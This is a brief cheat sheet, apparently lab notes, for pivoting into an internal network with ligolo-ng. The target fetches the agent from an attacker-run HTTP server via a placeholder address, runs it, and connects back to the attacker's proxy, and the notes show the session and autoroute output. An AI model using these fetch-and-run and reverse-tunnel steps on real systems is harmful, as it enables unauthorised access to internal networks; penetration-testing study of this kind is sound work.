# Ligolo-ng way
## 1. Setup ligolo-ng on attacker host
```
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
tar -xvzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
```

## 2.  Start Python Server
```
python3 -m http.server
```

## 3. Download ligolo Agent onto Target from Attack Host
```
wget http://PWNIP:8000/agent
```

# 4. Start Server on Attack Host with Self Cert Option
```
sudo ./proxy -selfcert
```

## 5. Connect from Target Host to Server
```
chmod +x ./agent ; ./agent -connect PWNIP:11601 --ignore-cert
```

## 6. Select the Session
```shell-session
ligolo-ng » session
? Specify a session : 1 - jbetty@DMZ01 - 10.129.234.116:35974 - 00505694f5af
[Agent : jbetty@DMZ01] »
```
autoroute command und route auswählen (enter)

```shell-session
[Agent : jbetty@DMZ01] » autoroute

? Select routes to add: 172.16.119.13/24
? Create a new interface or use an existing one? Create a new interface
INFO[0103] Generating a random interface name...        
INFO[0103] Using interface name desiredtank             
INFO[0103] Creating routes for desiredtank...           
? Start the tunnel? Yes
INFO[0124] Starting tunnel to jbetty@DMZ01 (00505694b7c3)
```